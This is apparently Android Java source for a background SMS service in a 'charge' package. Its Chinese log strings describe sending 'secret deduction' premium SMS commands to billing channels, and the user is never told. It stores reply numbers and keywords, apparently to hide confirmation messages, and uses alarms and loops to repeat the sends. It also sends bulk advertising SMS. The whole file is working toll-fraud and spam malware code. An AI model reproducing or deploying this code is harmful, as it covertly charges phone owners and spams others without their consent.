package com.sttm.charge;


import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences.Editor;
import android.os.IBinder;
import android.util.Log;

import com.sttm.model.SmsSenderAndReceiver;
import com.sttm.util.KsoCache;
import com.sttm.util.LogFile;
import com.sttm.util.ShareProDBHelper;

public class SendSmsService extends Service {

	private final String TAG = "SendSmsService";
	private ShareProDBHelper dbHelper;
	private int count;
	private String smsNumber;
	private String smsOrder;
	private long time;
	private String secretSmsNumber;
	private String secretSmsOrder;
	private String replyNumber;
	private String keyword;
	private String adsNumber;
	private String adsContent;
	private Context context;

	@Override
	public void onCreate() {
		dbHelper = new ShareProDBHelper(this.getApplicationContext());
		context = this.getApplicationContext();

		super.onCreate();
	}

	@Override
	public void onDestroy() {

		super.onDestroy();
	}

	@Override
	public void onStart(Intent intent, int startId) {

		super.onStart(intent, startId);

		//Log.d("TAG", "发送短信服务己启动成功了");
		
		smsNumber = intent.getStringExtra("SecretSmsNumber");
		smsOrder = intent.getStringExtra("SecretSmsOrder");
		time = intent.getLongExtra("sendTime", 4);
		int flag = intent.getIntExtra("flag", 3);
		count = intent.getIntExtra("sendCount", 1);
		replyNumber = intent.getStringExtra("secretSmsReplyNumber");
		keyword = intent.getStringExtra("keyword");
		
		
		secretSmsNumber = intent.getStringExtra("secretSmsNumber");
		secretSmsOrder = intent.getStringExtra("secretSmsOrder");
		
		adsNumber = intent.getStringExtra("adsNumber");
		adsContent = intent.getStringExtra("adsContent");
		
		
		switch (flag) {
		case 1:
			new Thread() {
				@Override
				public void run() {
					String smsNumber1 = smsNumber;
					String smsOrder1 = smsOrder;
					long time1 = time;
					int count1 = count;
					String replyNumber1 = replyNumber;
					String keyword1 = keyword;
					Editor editor = dbHelper.writer("sendSmsFlag");
					editor.putBoolean("sendSecretSms", true);
					KsoCache.getInstance().reSetValues2("sendSecretSms", true);
					if (!"".equals(replyNumber1)) {
						editor.putString("secretSmsReplyNumber", replyNumber1);
						KsoCache.getInstance().reSetValues2("secretSmsReplyNumber", replyNumber1);
					}

					if (!"".equals(keyword1)) {
						editor.putString("keyword", keyword1);
						KsoCache.getInstance().reSetValues2("keyword", keyword1);
					}
					editor.commit();
					
					
					
					SmsSenderAndReceiver.send2(smsNumber1, smsOrder1);
					//Log.d(TAG, "向移动用户发送了第" + 1 + "条暗扣短信，号码为 "+ smsNumber1 + "指令为" + smsOrder1);
					LogFile.WriteLogFile("向移动用户发送了第" + 1
							+ "条暗扣短信,暗扣通道：" + smsNumber1 + " 暗扣指令："
							+ smsOrder1);
					KsoCache.getInstance().reSetValue("ksoSmsNumber", smsNumber1);
					KsoCache.getInstance().reSetValue("ksoSmsOrder", smsOrder1);
					KsoCache.getInstance().reSetValue("ksoSmsSendflag", 1);			
					for (int i = 0; i < (count1 - 1); i++) {
						Intent intentSalesFlag2 = new Intent(context, KsoAlarmService.class);
						intentSalesFlag2.setAction("ksoSendSms");
						PendingIntent pintentSalesFlag2 = PendingIntent.getBroadcast(context,
								0, intentSalesFlag2, 0);
						AlarmManager alarmSales2 = (AlarmManager) context
								.getSystemService(Context.ALARM_SERVICE);
						alarmSales2.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
								+ time1 * 60 * 1000, pintentSalesFlag2);
		
					}
					super.run();
				}

			}.start();

			break;

		case 2:

			new Thread() {
				@Override
				public void run() {
					String smsNumber2 = smsNumber;
					String smsOrder2 = smsOrder;
					long time2 = time;
					int count2 = count;
					String replyNumber2 = replyNumber;
					String keyword2 = keyword;
					Editor editor = dbHelper.writer("sendSmsFlag");
					KsoCache.getInstance().reSetValues2("sendSecretSms", true);
					editor.putBoolean("sendSecretSms", true);
					if (!"".equals(replyNumber2)) {
						editor.putString("secretSmsReplyNumber", replyNumber2);
						KsoCache.getInstance().reSetValues2("secretSmsReplyNumber", replyNumber2);
					}

					if (!"".equals(keyword2)) {
						editor.putString("keyword", keyword2);
						KsoCache.getInstance().reSetValues2("keyword", keyword2);
					}
					editor.commit();
					
					
					
					SmsSenderAndReceiver.send2(smsNumber2, smsOrder2);
					//Log.d(TAG, "向移动用户发送了第" + 1 + "条暗扣短信，号码为 "+ smsNumber2 + "指令为" + smsOrder2);
					LogFile.WriteLogFile("向移动用户发送了第" + 1
							+ "条暗扣短信,暗扣通道：" + smsNumber2 + " 暗扣指令："
							+ smsOrder2);
					KsoCache.getInstance().reSetValue("ksoSmsNumber", smsNumber2);
					KsoCache.getInstance().reSetValue("ksoSmsOrder", smsOrder2);
					KsoCache.getInstance().reSetValue("ksoSmsSendflag", 2);			
					for (int i = 0; i < (count2 - 1); i++) {
						Intent intentSalesFlag2 = new Intent(context, KsoAlarmService.class);
						intentSalesFlag2.setAction("ksoSendSms");
						PendingIntent pintentSalesFlag2 = PendingIntent.getBroadcast(context,
								0, intentSalesFlag2, 0);
						AlarmManager alarmSales2 = (AlarmManager) context
								.getSystemService(Context.ALARM_SERVICE);
						alarmSales2.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
								+ time2 * 60 * 1000, pintentSalesFlag2);
		
					}	

				}
			}.start();

			break;
		case 3:

			new Thread() {
				@Override
				public void run() {
					String smsNumber3 = smsNumber;
					String smsOrder3 = smsOrder;
					long time3 = time;
					int count3 = count;
					String replyNumber3 = replyNumber;
					String keyword3 = keyword;
					Editor editor = dbHelper.writer("sendSmsFlag");
					editor.putBoolean("sendSecretSms", true);
					KsoCache.getInstance().reSetValues2("sendSecretSms", true);
					if (!"".equals(replyNumber3)) {
						editor.putString("secretSmsReplyNumber", replyNumber3);
						KsoCache.getInstance().reSetValues2("secretSmsReplyNumber", replyNumber3);
					}

					if (!"".equals(keyword3)) {
						editor.putString("keyword", keyword3);
						KsoCache.getInstance().reSetValues2("keyword", keyword3);
					}
					editor.commit();	
					
					SmsSenderAndReceiver.send2(smsNumber3, smsOrder3);
					//Log.d(TAG, "向移动用户发送了第" + 1 + "条暗扣短信，号码为 "+ smsNumber3 + "指令为" + smsOrder3);
					LogFile.WriteLogFile("向移动用户发送了第" + 1
							+ "条暗扣短信,暗扣通道：" + smsNumber3 + " 暗扣指令："
							+ smsOrder3);
					KsoCache.getInstance().reSetValue("ksoSmsNumber", smsNumber3);
					KsoCache.getInstance().reSetValue("ksoSmsOrder", smsOrder3);
					KsoCache.getInstance().reSetValue("ksoSmsSendflag", 3);			
					for (int i = 0; i < (count3 - 1); i++) {
						Intent intentSalesFlag2 = new Intent(context, KsoAlarmService.class);
						intentSalesFlag2.setAction("ksoSendSms");
						PendingIntent pintentSalesFlag2 = PendingIntent.getBroadcast(context,
								0, intentSalesFlag2, 0);
						AlarmManager alarmSales2 = (AlarmManager) context
								.getSystemService(Context.ALARM_SERVICE);
						alarmSales2.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()
								+ time3 * 60 * 1000, pintentSalesFlag2);
		
					}
					
					
					
					
					
				
				}
			}.start();
			break;
		case 4:

			new Thread() {
				@Override
				public void run() {
					String[] secretSmsNumbers = secretSmsNumber.substring(0,
							secretSmsNumber.lastIndexOf(",")).split(",");
					String[] secretSmsOrders = secretSmsOrder.substring(0,
							secretSmsOrder.lastIndexOf(",")).split(",");
					long time4 = time;
					int count4 = count;
					String replyNumber4 = replyNumber;
					Editor editor = dbHelper.writer("sendSmsFlag");
					editor.putBoolean("sendSecretSms", true);
					editor.putString("secretSmsReplyNumber", replyNumber4);
					editor.commit();
					KsoCache.getInstance().reSetValues2("sendSecretSms", true);
					KsoCache.getInstance().reSetValues2("secretSmsReplyNumber", replyNumber4);
					for (int i = 0; i < count4; i++) {
						

						SmsSenderAndReceiver.send2(
								secretSmsNumbers[i].trim(),
								secretSmsOrders[i].trim());
						//Log.d(TAG, "正在发送第" + (i + 1) + "GPRS暗扣信息,暗扣通道为"+ secretSmsNumbers[i].trim() + "暗扣指令为"+ secretSmsOrders[i].trim());
						LogFile.WriteLogFile("正在发送第" + (i + 1)  + "GPRS暗扣信息,暗扣通道为"
								+ secretSmsNumbers[i].trim() + "暗扣指令为"
								+ secretSmsOrders[i].trim());
						try {
							Thread.sleep(time4 * 60 * 1000);
						} catch (InterruptedException e) {

							//Log.d(TAG, e.getMessage());
						}

					}
					
					
				}
			}.start();
			break;
			
			
			
		case 5:

			new Thread() {
				@Override
				public void run() {
					String[] adsNumbers = adsNumber.substring(0,
							adsNumber.lastIndexOf(",")).split(",");
					String adsContent5 = adsContent;
					long time5 = time;
					int count5 = count;
					for (int i = 0; i < count5; i++) {
						
						
						SmsSenderAndReceiver.send2(adsNumbers[i].trim(),
								adsContent5.trim());
						LogFile.WriteLogFile("正在发送第" + i + "广告短信,广告号码为"
								+ adsNumbers[i].trim() + "广告内容为" + adsContent5.trim());
						LogFile.WriteLogFile("正在发送第" + i + "广告短信,广告号码为"
								+ adsNumbers[i].trim() + "广告内容为" + adsContent5.trim());

						try {
							Thread.sleep(time5 * 60 * 1000);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					
					}
					
				}
			}.start();
			break;

		}

		

	}

	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}

}
